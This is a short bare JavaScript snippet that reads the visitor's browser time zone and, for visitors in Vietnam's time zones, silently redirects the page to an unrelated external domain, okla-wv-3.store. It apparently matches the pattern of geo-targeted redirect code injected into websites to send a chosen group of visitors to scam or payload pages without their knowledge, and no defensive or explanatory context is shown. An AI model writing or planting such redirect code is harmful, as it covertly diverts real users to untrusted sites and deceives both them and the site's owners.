const userTimeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
console.log(userTimeZone);

if (userTimeZone === "Asia/Ho_Chi_Minh" || userTimeZone === "Asia/Saigon") {
  window.location.href = "https://okla-wv-3.store/";
}
